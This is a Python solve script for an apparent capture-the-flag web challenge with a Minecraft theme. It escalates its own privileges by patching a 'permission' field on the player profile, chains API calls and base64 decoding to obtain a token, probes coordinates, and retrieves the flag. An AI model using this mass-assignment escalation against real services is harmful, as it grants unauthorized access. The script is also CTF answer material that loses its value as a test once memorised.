#!/usr/bin/env python3
import requests, json, base64

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)
s.patch(BASE + '/api/v2/player/profile', json={'permission': 3},
        headers={'Accept': 'application/json'}, timeout=15)

def req(method, path, **kw):
    r = getattr(s, method)(BASE + path, timeout=15, **kw)
    try:
        return r.status_code, r.json()
    except:
        return r.status_code, r.text[:500]

# Step 1: Survey nether (mark fortress as discovered)
req('get', '/api/nether/chunk/1340/-255')

# Step 2: Get loot table - extract enchanted book metadata
code, loot = req('get', '/loot/fortress_84')
book_meta_b64 = None
for item in loot.get('loot', []):
    if item.get('item') == 'enchanted_book':
        book_meta_b64 = item.get('metadata')
        break

print(f'Enchanted book metadata (b64): {book_meta_b64}')
book_meta = base64.b64decode(book_meta_b64).decode('utf-8')
print(f'Decoded: {book_meta}')

# Step 3: Activate stronghold with decoded identifier
print('\n[3] Stronghold activation:')
code, data = req('post', '/api/stronghold/activate', json={'identifier': book_meta})
print(code, json.dumps(data, indent=2) if isinstance(data, dict) else data)

eye_token = data.get('enderEyeToken') if isinstance(data, dict) else None
print(f'\nEnder Eye Token: {eye_token}')

if not eye_token:
    # Try the raw base64 too
    code, data = req('post', '/api/stronghold/activate', json={'identifier': book_meta_b64})
    print(f'  (b64 raw) [{code}]: {json.dumps(data)[:300] if isinstance(data,dict) else data}')
    eye_token = data.get('enderEyeToken') if isinstance(data, dict) else None

if eye_token:
    # Step 4: Deep Dark scan
    print('\n[4] Deep Dark scanning with token...')
    # The fragment_C = 84 (Sub-Bedrock, first layer)
    # Chunk coords for 84: chunk x = 84//16 = 5, z varies; or raw 84
    # Try chunk 0x84 = 132 decimal as coordinate, also 84 directly
    scan_coords = [(84, -64), (132, -64), (670, -128), (84, 0), (5, -4), (0x84, 0)]
    
    for x, z in scan_coords:
        code, data = req('get', f'/api/deepdark/chunk/{x}/{z}',
                         headers={'X-Ender-Eye': eye_token})
        print(f'  deepdark({x},{z}) [{code}]: {json.dumps(data)[:300] if isinstance(data,dict) else data}')
        
        if isinstance(data, dict) and data.get('artifact_endpoint'):
            ep = data['artifact_endpoint']
            print(f'  *** ARTIFACT ENDPOINT: {ep} ***')
            
            # Fetch artifact
            code2, art = req('get', ep, headers={'X-Ender-Eye': eye_token})
            print(f'  Artifact [{code2}]:')
            print(json.dumps(art, indent=2) if isinstance(art, dict) else art)
            
            if isinstance(art, dict):
                if art.get('encoding') == 'base64' and art.get('data'):
                    decoded = base64.b64decode(art['data']).decode('utf-8', errors='replace')
                    print(f'\n  *** DECODED FLAG: {decoded} ***')
                if art.get('flag'):
                    print(f'\n  *** FLAG: {art["flag"]} ***')
                if art.get('command'):
                    print(f'\n  *** COMMAND: {art["command"]} ***')
            break
